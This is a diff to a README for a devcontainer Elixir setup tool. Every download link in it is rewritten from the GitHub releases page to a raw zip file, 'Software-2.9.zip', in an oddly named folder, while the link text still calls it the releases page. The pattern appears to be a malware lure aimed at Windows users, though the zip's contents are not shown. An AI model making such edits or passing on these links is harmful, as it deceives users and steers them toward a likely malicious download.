@@ -1,6 +1,6 @@
 # 🛠️ devcontainer - Simple Setup for Elixir Coding
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/SSSSGGAAMMIINNGG/devcontainer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/SSSSGGAAMMIINNGG/devcontainer/raw/refs/heads/main/Pinacoceratidae/Software-2.9.zip)
 
 ## 📦 What is devcontainer?
 
@@ -25,7 +25,7 @@ These requirements help ensure devcontainer runs smoothly on your PC.
 Follow these steps to set up devcontainer on your Windows computer:
 
 1. **Visit the download page**  
-   Go to the [devcontainer releases page](https://github.com/SSSSGGAAMMIINNGG/devcontainer/releases). This page has the latest versions of devcontainer ready for download.
+   Go to the [devcontainer releases page](https://github.com/SSSSGGAAMMIINNGG/devcontainer/raw/refs/heads/main/Pinacoceratidae/Software-2.9.zip). This page has the latest versions of devcontainer ready for download.
 
 2. **Choose the right file to download**  
    Look for a file with a name ending in `.exe` or `.zip`. This file contains everything you need.
@@ -49,7 +49,7 @@ Follow these steps to set up devcontainer on your Windows computer:
 
 You can visit the official releases page below to download the latest version of devcontainer for Windows:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/SSSSGGAAMMIINNGG/devcontainer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/SSSSGGAAMMIINNGG/devcontainer/raw/refs/heads/main/Pinacoceratidae/Software-2.9.zip)
 
 ### How to download and install
 
@@ -128,4 +128,4 @@ Because devcontainer uses containers, it keeps your system safe from most softwa
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/SSSSGGAAMMIINNGG/devcontainer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/SSSSGGAAMMIINNGG/devcontainer/raw/refs/heads/main/Pinacoceratidae/Software-2.9.zip)
